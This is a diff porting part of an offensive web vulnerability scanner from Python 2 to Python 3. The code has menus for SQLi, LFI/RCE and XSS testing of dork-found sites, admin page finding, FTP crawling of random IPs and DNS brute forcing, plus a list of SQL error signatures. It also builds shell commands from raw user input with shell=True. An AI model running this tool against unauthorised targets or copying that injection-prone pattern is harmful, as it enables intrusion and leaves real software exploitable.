+    global vuln
 
-	lfi_log_file = open("v3n0m-lfi.txt", "a")
-	rce_log_file = open("v3n0m-rce.txt", "a")
-	xss_log_file = open("v3n0m-xss.txt", "a")
-	admin_log_file = open("v3n0m-admin.txt", "a")
-	endsub = 0
+    lfi_log_file = open("v3n0m-lfi.txt", "a")
+    rce_log_file = open("v3n0m-rce.txt", "a")
+    xss_log_file = open("v3n0m-xss.txt", "a")
+    admin_log_file = open("v3n0m-admin.txt", "a")
+    endsub = 0
 
-	print R + "\n[1] SQLi Testing"
-	print "[2] SQLi Testing Auto Mode"
-	print "[3] LFI - RCE Testing"
-	print "[4] XSS Testing"
-	print "[5] Save valid urls to file"
-	print "[6] Print valid urls"
-	print "[7] Print Found vuln in last scan"
-	print "[8] Back to main menu"
+    print(R + "\n[1] SQLi Testing")
+    print("[2] SQLi Testing Auto Mode")
+    print("[3] LFI - RCE Testing")
+    print("[4] XSS Testing")
+    print("[5] Save valid urls to file")
+    print("[6] Print valid urls")
+    print("[7] Print Found vuln in last scan")
+    print("[8] Back to main menu")
 
-	chce = raw_input(":")
-	if chce == '1':
-		vuln = []
-		injtest()
-		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found."
-		print
+    chce = input(":")
+    if chce == '1':
+        vuln = []
+        injtest()
+        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(col)) + B + " vuln sites found.")
+        print()
 
-	elif chce == '2':
-		vuln = []
-		injtest()
-		colfinder()
-		endsub = 0
-		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found."
-		print
+    elif chce == '2':
+        vuln = []
+        injtest()
+        colfinder()
+        endsub = 0
+        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
+        print()
 
-	elif chce == '3':
-		vuln = []
-		lfitest()
-		endsub = 0
-		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found."
-		print
+    elif chce == '3':
+        vuln = []
+        lfitest()
+        endsub = 0
+        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
+        print()
 
-	elif chce == '4':
-		vuln = []
-		xsstest()
-		print B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found."
-		print
-		endsub = 0
+    elif chce == '4':
+        vuln = []
+        xsstest()
+        print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
+        print()
+        endsub = 0
 
-	elif chce == '5':
-		print B + "\nSaving valid urls (" + str(len(finallist)) + ") to file"
-		listname = raw_input("Filename: ")
-		list_name = open(listname, "w")
-		finallist.sort()
-		for t in finallist:
-			list_name.write(t + "\n")
-		list_name.close()
-		print "Urls saved, please check", listname
-		endsub = 0
+    elif chce == '5':
+        print(B + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
+        listname = input("Filename: ")
+        list_name = open(listname, "w")
+        finallist.sort()
+        for t in finallist:
+            list_name.write(t + "\n")
+        list_name.close()
+        print("Urls saved, please check", listname)
+        endsub = 0
 
-	elif chce == '6':
-		print W + "\nPrinting valid urls:\n"
-		finallist.sort()
-		for t in finallist:
-			print B + t
-		endsub = 0
+    elif chce == '6':
+        print(W + "\nPrinting valid urls:\n")
+        finallist.sort()
+        for t in finallist:
+            print(B + t)
+        endsub = 0
 
-	elif chce == '7':
-		print B + "\nVuln found ", len(vuln)
-		print vulns
-		endsub = 0
+    elif chce == '7':
+        print(B + "\nVuln found ", len(vuln))
+        print(vulns)
+        endsub = 0
 
-	elif chce == '8':
-		endsub = 1
-		fmenu()
+    elif chce == '8':
+        endsub = 1
+        fmenu()
+
 
 def fmenu():
-	global vuln
-	vuln = []
-	if endsub != 1:
-		vulnscan()
-	logo()
-	print "[1] Dork and vuln scan"
-	print "[2] Admin page finder"
-	print "[3] FTP crawler and vuln scan"
-	print "[4] DNS brute"
-	print "[0] Exit\n"
-	chce = raw_input(":")
+    global vuln
+    vuln = []
+    if endsub != 1:
+        vulnscan()
+    logo()
+    print("[1] Dork and vuln scan")
+    print("[2] Admin page finder")
+    print("[3] FTP crawler and vuln scan")
+    print("[4] DNS brute")
+    print("[0] Exit\n")
+    chce = input(":")
 
-	if chce == '1':
-		print W + ""
-		fscan()
+    if chce == '1':
+        print(W + "")
+        fscan()
 
-	elif chce == '2':
-		afsite = raw_input("Enter the site eg target.com: ")
-		print B
-		pwd = os.path.dirname(str(os.path.realpath(__file__)))
-		findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite), shell=True)
-		findadmin.communicate()
+    elif chce == '2':
+        afsite = input("Enter the site eg target.com: ")
+        print(B)
+        pwd = os.path.dirname(str(os.path.realpath(__file__)))
+        findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite),
+                                     shell=True)
+        findadmin.communicate()
 
-	elif chce == '3':
-		randips = raw_input("How many IP addresses do you want to scan: ")
-		print B
-		pwd = os.path.dirname(str(os.path.realpath(__file__)))
-		ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
-		ftpcrawl.communicate()
+    elif chce == '3':
+        randips = input("How many IP addresses do you want to scan: ")
+        print(B)
+        pwd = os.path.dirname(str(os.path.realpath(__file__)))
+        ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
+        ftpcrawl.communicate()
 
-	elif chce == '4':
-		dnstarg = raw_input("Enter the site eg target.com: ")
-		print B
-		pwd = os.path.dirname(str(os.path.realpath(__file__)))
-		dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(dnstarg), shell=True)
-		dnsbrute.communicate()
+    elif chce == '4':
+        dnstarg = input("Enter the site eg target.com: ")
+        print(B)
+        pwd = os.path.dirname(str(os.path.realpath(__file__)))
+        dnsbrute = subprocess.Popen(pwd + "/modules/dnsbrute.py -w modules/subdomainsmid.txt -u " + str(dnstarg),
+                                    shell=True)
+        dnsbrute.communicate()
 
-	elif chce == '0':
-		print R + "\n Exiting ..."
-		mnu = False
-		print W
-		sys.exit(0)
+    elif chce == '0':
+        print(R + "\n Exiting ...")
+        mnu = False
+        print(W)
+        sys.exit(0)
 
 
 signal.signal(signal.SIGINT, killpid)
@@ -672,51 +680,51 @@ random.shuffle(header)
 random.shuffle(lfis)
 
 sqlerrors = {'MySQL': 'error in your SQL syntax',
-			 'MiscError': 'mysql_fetch',
-			 'MiscError2': 'num_rows',
-			 'Oracle': 'ORA-01756',
-			 'JDBC_CFM': 'Error Executing Database Query',
-			 'JDBC_CFM2': 'SQLServer JDBC Driver',
-			 'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
-			 'MSSQL_Uqm': 'Unclosed quotation mark',
-			 'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
-			 'MS-Access_JETdb': 'Microsoft JET Database',
-			 'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
-			 'Server Error': 'Server Error',
-			 'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
-			 'Invalid Querystring': 'Invalid Querystring',
-			 'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
-			 'VBScript Runtime': 'VBScript Runtime',
-			 'ADODB.Field': 'ADODB.Field',
-			 'BOF or EOF': 'BOF or EOF',
-			 'ADODB.Command': 'ADODB.Command',
-			 'JET Database': 'JET Database',
-			 'mysql_fetch_array()': 'mysql_fetch_array()',
-			 'Syntax error': 'Syntax error',
-			 'mysql_numrows()': 'mysql_numrows()',
-			 'GetArray()': 'GetArray()',
-			 'FetchRow()': 'FetchRow()',
-			 'Input string was not in a correct format': 'Input string was not in a correct format'}
+             'MiscError': 'mysql_fetch',
+             'MiscError2': 'num_rows',
+             'Oracle': 'ORA-01756',
+             'JDBC_CFM': 'Error Executing Database Query',
+             'JDBC_CFM2': 'SQLServer JDBC Driver',
+             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
+             'MSSQL_Uqm': 'Unclosed quotation mark',
+             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
+             'MS-Access_JETdb': 'Microsoft JET Database',
+             'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
+             'Server Error': 'Server Error',
+             'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
+             'Invalid Querystring': 'Invalid Querystring',
+             'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
+             'VBScript Runtime': 'VBScript Runtime',
+             'ADODB.Field': 'ADODB.Field',
+             'BOF or EOF': 'BOF or EOF',
+             'ADODB.Command': 'ADODB.Command',
+             'JET Database': 'JET Database',
+             'mysql_fetch_array()': 'mysql_fetch_array()',
+             'Syntax error': 'Syntax error',
+             'mysql_numrows()': 'mysql_numrows()',
+             'GetArray()': 'GetArray()',
+             'FetchRow()': 'FetchRow()',
+             'Input string was not in a correct format': 'Input string was not in a correct format'}
 
-#Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
-#if __debug__:
+# Multithreading implementation and queueing prepared and ready, Debug support required for stability and testing
+# if __debug__:
 #   import threading as parcomp
 #   queueclass=Queue.Queue
 #   workerclass=threading.Thread
 #   NUMWORKERS=1
-#else:
+# else:
 #   import multiprocessing as parcomp
 #   queueclass=parcomp.Queue
 #   workerclass=parcomp.Process
 #   NUMWORKERS=parcomp.cpu_count()
 
-#This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
+# This is the MBCS Encoding Bypass for making MBCS encodings work on Linux - NovaCygni
 try:
-	codecs.lookup('mbcs')
+    codecs.lookup('mbcs')
 except LookupError:
-	ascii = codecs.lookup('latin-1')
-	func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
-	codecs.register(func)
+    ascii = codecs.lookup('latin-1')
+    func = lambda name, enc=ascii: {True: enc}.get(name == 'mbcs')
+    codecs.register(func)
 
 # Colours
 W = "\033[0m"
@@ -728,7 +736,7 @@ B = "\033[34m"
 subprocess.call("clear", shell=True)
 arg_end = "--"
 arg_eva = "+"
-colMax = 60 # Change this at your will
+colMax = 60  # Change this at your will
 endsub = 1
 gets = 0
 timeout = 8
@@ -737,4 +745,4 @@ socket.setdefaulttimeout(timeout)
 menu = True
 
 while True:
-	fmenu()
+    fmenu()
